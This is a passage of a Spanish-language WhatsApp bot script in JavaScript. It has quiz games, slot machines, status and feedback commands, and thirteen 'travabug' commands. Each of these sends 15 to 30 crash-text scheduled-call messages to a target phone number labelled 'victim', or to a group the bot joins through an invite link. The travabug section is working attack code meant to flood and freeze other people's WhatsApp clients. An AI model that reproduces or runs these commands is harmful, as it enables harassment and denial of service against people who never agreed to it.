if(!fs.existsSync(`./archivos/juegos/dragonz-${from}.json`)) return enviar('⛔️ 𝗡𝗢 𝗘𝗦𝗧𝗔 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢 𝗔𝗨𝗡')
fs.unlinkSync(`./archivos/juegos/dragonz-${from}.json`)
enviar("⛔️ 𝐌𝐔𝐍𝐃𝐎 𝐃𝐑𝐀𝐆𝐎𝐍 𝐃𝐄𝐒𝐀𝐂𝐓𝐈𝐕𝐀𝐃𝐎")
} else if(q == "revelar") {
  
var dragon2 = JSON.parse(fs.readFileSync(`./archivos/juegos/dragonz-${from}.json`))
dragon3 = await getBuffer(dragon2.foto) 
const respiuiii3 =    `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗥𝗘𝗦𝗣𝗨𝗘𝗦𝗧𝗔 : ${dragon2.original}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
await sock.sendMessage(from,{image : dragon3, caption : respiuiii3},{quoted: info})
} else {
fs.writeFileSync(`./archivos/juegos/dragonz-${from}.json`, `${JSON.stringify(dragonz[dragoncito])}`)
enviar("⛔️ *Digite .dragonz on Para empezar a Jugar, .dragonz off Para apagarlo y .dragonz revelar para hacer trampa* ")
}

break

case "narutoword":
if(!isGroup) return enviar(respuesta.grupos)
let animequizzz = Math.floor(Math.random() * mundoNaruto.length)
if(q =="on") {
     
if(fs.existsSync(`./archivos/juegos/mundoNaruto-${from}.json`)) {
let dataDoss = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoNaruto-${from}.json`))
textoAdiviname = ` ⛔️ 𝘼𝘿𝙄𝙑𝙄𝙉𝘼 𝙇𝘼 𝙄𝙈𝘼𝙂𝙀𝙉 \n\n¿Te consideras un verdadero fans?\n\nEntonces demuestralo aquí \n\nObserva atentamente la imagen\n\n`
wew = await getBuffer(dataDoss.foto)   
await sock.sendMessage(from,{image : wew,caption : textoAdiviname},{quoted: info})
} else {
enviar(`[🕹] Creando Database del Juego\nVuelve a digitar el comando Porfavor : narutoword on`)
fs.writeFileSync(`./archivos/juegos/mundoZ-${from}.json`, `${JSON.stringify(mundoNaruto[animequizzz])}`)
}
} else if(q == "off") {
if(!fs.existsSync(`./archivos/juegos/mundoNaruto-${from}.json`)) return enviar('⛔️ 𝗡𝗢 𝗘𝗦𝗧𝗔 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢 𝗔𝗨𝗡')
fs.unlinkSync(`./archivos/juegos/mundoNaruto-${from}.json`)
enviar("⛔️ 𝐌𝐔𝐍𝐃𝐎 𝐍𝐀𝐑𝐔𝐓𝐎 𝐃𝐄𝐒𝐀𝐂𝐓𝐈𝐕𝐀𝐃𝐎")
} else if(q == "revelar") {
     
var dataDoss = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoNaruto-${from}.json`)) 
wew = await getBuffer(dataDoss.foto)   
const respiuiii2 =    `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗥𝗘𝗦𝗣𝗨𝗘𝗦𝗧𝗔 : ${dataDoss.original}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
await sock.sendMessage(from,{image : wew, caption : respiuiii2},{quoted: info})
} else {
fs.writeFileSync(`./archivos/juegos/mundoNaruto-${from}.json`, `${JSON.stringify(mundoNaruto[animequizzz])}`)
enviar("⛔️ *Digite .narutoword on Para empezar a Jugar, .narutoword off Para apagarlo y .narutoword revelar para hacer trampa* ")
}

break
case "oneword":
if(!isGroup) return enviar(respuesta.grupos)
let oneo = Math.floor(Math.random() * mundoone.length)
if(q =="on") {
     
if(fs.existsSync(`./archivos/juegos/mundoone-${from}.json`)) {
let one2 = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoone-${from}.json`))
textoOne =` [⛔️] 𝘼𝘿𝙄𝙑𝙄𝙉𝘼 𝙇𝘼 𝙄𝙈𝘼𝙂𝙀𝙉 \n\n¿Te consideras un verdadero fans?\n\nEntonces demuestralo aquí \n\nObserva atentamente la imagen\n\n`
one3 = await getBuffer(one2.foto)   
await sock.sendMessage(from,{image : one3,caption : textoOne},{quoted: info})
} else {
enviar(`[🕹] Creando Database del Juego\nVuelve a digitar el comando Porfavor : oneword on`)
fs.writeFileSync(`./archivos/juegos/mundoone-${from}.json`, `${JSON.stringify(mundoone[oneo])}`)
}
} else if(q == "off") {
if(!fs.existsSync(`./archivos/juegos/mundoone-${from}.json`)) return enviar('[⛔️] 𝗡𝗢 𝗘𝗦𝗧𝗔 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢 𝗔𝗨𝗡')
fs.unlinkSync(`./archivos/juegos/mundoone-${from}.json`)
enviar("[⛔️] 𝐌𝐔𝐍𝐃𝐎 𝐎𝐍𝐄 𝐃𝐄𝐒𝐀𝐂𝐓𝐈𝐕𝐀𝐃𝐎")
} else if(q == "revelar") {
     
var one2 = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoone-${from}.json`))
one4 = await getBuffer(one2.foto) 
const respiuiii5 = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗥𝗘𝗦𝗣𝗨𝗘𝗦𝗧𝗔 : ${one2.original}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`   
await sock.sendMessage(from,{image : one4,caption : textoOne},{quoted: info})
} else {
fs.writeFileSync(`./archivos/juegos/mundoone-${from}.json`, `${JSON.stringify(mundoone[oneo])}`)
enviar("⛔️ *Digite .oneword on Para empezar a Jugar, .oneword off Para apagarlo y .oneword revelar para hacer trampa* ")
}
break

case "diferencias":
if(!isGroup) return enviar(respuesta.grupos)
let difok = Math.floor(Math.random() *diferenciastop.length)
if(q =="on") {     
if(fs.existsSync(`./archivos/juegos/diferenciastop-${from}.json`)) {
let dif2 = JSON.parse(fs.readFileSync(`./archivos/juegos/diferenciastop-${from}.json`))
textoDif =`[⛔️] 𝐃𝐈𝐅𝐄𝐑𝐄𝐍𝐂𝐈𝐀𝐒 \n\nVamos concentrate\n\nYo se que tú puedes.\n\nMira bien la imagen y ve los errores.`
dif3 = await getBuffer(dif2.imagenfake)   
await sock.sendMessage(from,{image : dif3,caption : textoDif},{quoted: info})
} else {
enviar(`[🕹] Creando Database del Juego\nVuelve a digitar el comando Porfavor : diferencias on`)
fs.writeFileSync(`./archivos/juegos/diferenciastop-${from}.json`, `${JSON.stringify(diferenciastop[difok])}`)
}
} else if(q == "off") {
if(!fs.existsSync(`./archivos/juegos/diferenciastop-${from}.json`)) return enviar('𝗡𝗢 𝗘𝗦𝗧𝗔 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢 𝗔𝗨𝗡')
fs.unlinkSync(`./archivos/juegos/diferenciastop-${from}.json`)
enviar("𝐃𝐈𝐅𝐄𝐑𝐄𝐍𝐂𝐈𝐀𝐒 𝐃𝐄𝐒𝐀𝐂𝐓𝐈𝐕𝐀𝐃𝐎")
} else if(q == "revelar") {
     
let dif2 = JSON.parse(fs.readFileSync(`./archivos/juegos/diferenciastop-${from}.json`))
textoDif =`[⛔️] 𝐃𝐈𝐅𝐄𝐑𝐄𝐍𝐂𝐈𝐀𝐒 \n\nVamos concentrate\n\nYo se que tú puedes.\n\nMira bien la imagen y ve los errores.\n\n[🔎] 𝗥𝗘𝗦𝗣𝗨𝗘𝗦𝗧𝗔 : ${dif2.original}`
dif4 = await getBuffer(dif2.imagenrespuesta)   
await sock.sendMessage(from,{image : dif4,caption : textoDif},{quoted: info})
} else {
fs.writeFileSync(`./archivos/juegos/diferenciastop-${from}.json`, `${JSON.stringify(diferenciastop[difok])}`)
enviar("⛔️ *Digite .diferencias on Para empezar a Jugar, .diferencias off Para apagarlo y .diferencias revelar para hacer trampa* ")
}
break

case "emojirefran":
if(!isGroup) return enviar(respuesta.grupos)
let diref = Math.floor(Math.random() *emojirefran.length)
if(q =="on") {
     
if(fs.existsSync(`./archivos/juegos/emojirefran-${from}.json`)) {
let difEmo = JSON.parse(fs.readFileSync(`./archivos/juegos/emojirefran-${from}.json`))
textoEmo =`
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝙍𝙀𝙁𝙍𝘼𝙉 : ${difEmo.refran}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(textoEmo)
} else {
enviar(`[🕹] Creando Database del Juego\nVuelve a digitar el comando Porfavor : emojirefran on`)
fs.writeFileSync(`./archivos/juegos/emojirefran-${from}.json`, `${JSON.stringify(emojirefran[diref])}`)
}
} else if(q == "off") {
if(!fs.existsSync(`./archivos/juegos/emojirefran-${from}.json`)) return enviar('[⛔️] 𝗡𝗢 𝗘𝗦𝗧𝗔 𝗔𝗖𝗧𝗜𝗩𝗔𝗗𝗢 𝗔𝗨𝗡')
fs.unlinkSync(`./archivos/juegos/emojirefran-${from}.json`)
enviar("[⛔️] 𝐄𝐌𝐎𝐉𝐈 𝐑𝐄𝐅𝐑𝐀𝐍 𝐃𝐄𝐒𝐀𝐂𝐓𝐈𝐕𝐀𝐃𝐎")
} else if(q == "revelar") {
     
let difEmo = JSON.parse(fs.readFileSync(`./archivos/juegos/emojirefran-${from}.json`))
textoEmo =`
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝙍𝙀𝙁𝙍𝘼𝙉 : ${difEmo.refran}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(textoEmo)
} else {
fs.writeFileSync(`./juegos/emojirefran-${from}.json`, `${JSON.stringify(emojirefran[diref])}`)
enviar("⛔️ *Digite .emojirefran on Para empezar a Jugar, .emojirefran off Para apagarlo y .emojirefran revelar para hacer trampa* ")
}

break
case 'report': case 'bug': case 'reporte':
if(!isGroup) return enviar(respuesta.grupos)
        if (!q) return enviar('[⛔️] *Ejemplo* : *Bug en el menú* ')
        setTimeout(async function () {
enviar(` *[⛔️] Gracias por reportar el Bug, con mi creador* \n *Se revisará el bug, si en caso es falso, se ignorará el mensaje* `)
}, 1000)        
        let reportBug = `♨️𝗕𝘂𝗴♨️\n *Número* : @${sender.split('@')[0]},\n *Reporto* :\n${q}`
        sock.sendMessage(BotNumber, { text : reportBug}, { quoted : info})
        break
 
case 'speed': case 'ping': case "bateria": case "status":
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
hora1 = moment.tz('America/Lima').format('HH:mm:ss');
const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()                
                respon = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙄𝙉𝙁𝙊 𝙎𝙀𝙍𝙑𝙀𝙍⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙍𝘼𝙈: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
╿║ ➪ 𝙍𝙀𝙎𝙋𝙐𝙀𝙎𝙏𝘼: ${latensie.toFixed(4)}
╿║ ➪ 𝙈𝙀𝙉𝙎𝘼𝙅𝙀𝙎 : ${latensi.toFixed(4)} 
╿║ ➪ 𝘼𝘾𝙏𝙄𝙑𝙊 : ${runtime(process.uptime())}
╿║ ➪ 𝙊𝙉: ${runtime(uptime)}
╿║ ➪ 𝙃𝙊𝙍𝘼 : ${hora1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
                `.trim()
await sock.sendMessage(from,{ text : `${respon}` }, { quoted : info})
break
case 'nvcmd': case 'nuevocomando': case "idea": case "sugerir":
if(!isGroup) return enviar(respuesta.grupos)
        if (!q) return enviar('[⛔️] *Ejemplo* : *idea crea el comando registrar* ')
        setTimeout(async function () {
enviar(` *[⛔️] Gracias por brindar una nueva idea a mi creador* \n *Haremos lo posible para hacerlo realidad* `)
}, 1000)        
        let ideaNueva = `♨️ *IDEA DE COMANDO* ♨️\n *Número* : @${sender.split('@')[0]},\n *Idea* :\n${q}`
        sock.sendMessage(BotNumber, { text : ideaNueva}, { quoted : info})
        break      
case 'travabug1': case 'travabug': {
if(!isGroup) return enviar(respuesta.grupos) 
if(!isOwner) return enviar(respuesta.premiun)
if (!args[0]) return enviar(` Uselo asi : .travabug 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Se enviaron ${amount} trabas que usted digito : Haga una pausa de 3 minutos*`)
break
case 'travabug2' :{
if(!isGroup) return enviar(respuesta.grupos) 
if(!isOwner) return enviar(respuesta.premiun)
 if (!args[0]) return enviar(` Uselo asi : .travabug2 51987268192`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas correctamente a ${victim} Haga una pausa de 3 minutos*`)
break
case 'travabug3': {
if(!isGroup) return enviar(respuesta.grupos) 
if(!isOwner) return enviar(respuesta.premiun)
if (!args[0]) return enviar(` Uselo asi : .travabug3 51987268192`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas correctamente a ${victim} Haga una pausa de 3 minutos*`)
break
case 'travabug4' : {
if(!isGroup) return enviar(respuesta.grupos) 
if(!isOwner) return enviar(respuesta.premiun)
 if (!args[0]) return enviar(`Uselo asi : .travabug4 https://chat.whatsapp.com/JRePIosUuuG7wiU9ZY2Sy0`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await sock.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas a ${xeongc} Haga una pausa de 3 minutos*`)
break
case 'travabug5' :  {
if(!isGroup) return enviar(respuesta.grupos) 
if(!isOwner) return enviar(respuesta.premiun)
if (!args[0]) return enviar(`Uselo asi : .travabug5 https://chat.whatsapp.com/JRePIosUuuG7wiU9ZY2Sy0`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await sock.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas a ${xeongc} Haga una pausa de 3 minutos*`)
break
case 'travabug6' : {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
if(!isGroup) return enviar(respuesta.grupos) 
if (!args[0]) return enviar(` Uselo asi : .travabug6 51987268192`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas correctamente a ${victim} Haga una pausa de 3 minutos*`)
break
case 'travabug7' : {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*") 
if(!isGroup) return enviar(respuesta.grupos) 
if (!args[0]) return enviar(` Uselo asi : .travabug7 51987268192`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas correctamente a ${victim} Haga una pausa de 3 minutos*`)
break
case 'travabug8' :  {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
if(!isGroup) return enviar(respuesta.grupos) 
if (!args[0]) return enviar(`Uselo asi : .travabug8 https://chat.whatsapp.com/JRePIosUuuG7wiU9ZY2Sy0`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await sock.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas a ${xeongc} Haga una pausa de 3 minutos*`)
break
case 'travabug9' : {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
if(!isGroup) return enviar(respuesta.grupos) 
if (!args[0]) return enviar(` Uselo asi : .travabug9 51987268192`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas correctamente a ${victim} Haga una pausa de 3 minutos*`)
break
case 'travabug10' :  {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")  
if(!isGroup) return enviar(respuesta.grupos) 
if (!args[0]) return enviar(`Uselo asi : .travabug10 https://chat.whatsapp.com/JRePIosUuuG7wiU9ZY2Sy0`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await sock.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas a ${xeongc} Haga una pausa de 3 minutos*`)
break

case 'travabug11': {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
if(!isGroup) return enviar(respuesta.grupos) 
if (!args[0]) return enviar(` Uselo asi : .travabug11 51987268192`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas correctamente a ${victim} Haga una pausa de 3 minutos*`)
break

case 'travabug12' :  {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")   
if(!isGroup) return enviar(respuesta.grupos) 
if (!args[0]) return enviar(`Uselo asi : .travabug12 https://chat.whatsapp.com/JRePIosUuuG7wiU9ZY2Sy0`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await sock.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas a ${xeongc} Haga una pausa de 3 minutos*`)
break

case 'travabug13' :  {
 if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*") 
if(!isGroup) return enviar(respuesta.grupos) 
 if (!args[0]) return enviar(`Uselo asi : .travabug13 https://chat.whatsapp.com/JRePIosUuuG7wiU9ZY2Sy0`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await sock.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : info})
sock.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
enviar(`*Trabas enviadas a ${xeongc} Haga una pausa de 3 minutos*`)
break
case "slot":
let emojise = ["🍁", "⚡", "🍇","💎","🎲","💰","💡","🪙"];
let ax = Math.floor(Math.random() * emojise.length);
let bx = Math.floor(Math.random() * emojise.length);
let cx = Math.floor(Math.random() * emojise.length);
let xx = [],
yx = [],
zx = [];
for (let i = 0; i < 3; i++) {
xx[i] = emojise[ax];
ax++;
if (ax == emojise.length) ax = 0;
}
for (let i = 0; i < 3; i++) {
yx[i] = emojise[bx];
bx++;
if (bx == emojise.length) bx = 0;
}
for (let i = 0; i < 3; i++) {
zx[i] = emojise[cx];
cx++;
if (cx == emojise.length) cx = 0;
}
let end;
if (ax == bx && bx == cx) {
end = ` 𝙂𝘼𝙉𝘼𝙎𝙏𝙀 `
} else if (ax == bx || ax == cx || bx == cx) {
end = ` 𝙋𝙀𝙍𝘿𝙄𝙎𝙏𝙀 `
} else {
end = ` 𝙋𝙀𝙍𝘿𝙄𝙎𝙏𝙀 `
}
let slor = `
╭━⊷ ${end}
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ ${xx[0]} : ${yx[0]} : ${zx[0]}
╿║ ➪ ${xx[1]} : ${yx[1]} : ${zx[1]}
╿║ ➪ ${xx[2]} : ${yx[2]} : ${zx[2]}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ ${end}`
enviar(slor)
break
case "slot2":
let emojisep = ["🐈", "🐓", "🐙","🦍","🐒","🦧","🐵","🐶","🦁","🐄","🐈","🐇","🐼","🐧","🐦"];
let axx = Math.floor(Math.random() * emojisep.length);
let bxx = Math.floor(Math.random() * emojisep.length);
let cxx = Math.floor(Math.random() * emojisep.length);
let xxx = [],
yxx = [],
zxx = [];
for (let i = 0; i < 3; i++) {
xxx[i] = emojisep[axx];
axx++;
if (axx == emojisep.length) axx = 0;
}
for (let i = 0; i < 3; i++) {
yxx[i] = emojisep[bxx];
bxx++;
if (bxx == emojisep.length) bxx = 0;
}
for (let i = 0; i < 3; i++) {
zxx[i] = emojisep[cxx];
cxx++;
if (cxx == emojisep.length) cxx = 0;
}
let endx;
if (axx == bxx && bxx == cxx) {
endx = ` 𝙂𝘼𝙉𝘼𝙎𝙏𝙀 `
} else if (axx == bxx || axx == cxx || bxx == cxx) {
endx = ` 𝙋𝙀𝙍𝘿𝙄𝙎𝙏𝙀 `
} else {
endx = ` 𝙋𝙀𝙍𝘿𝙄𝙎𝙏𝙀 `
}
let slorx = `
╭━⊷ ${endx}
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
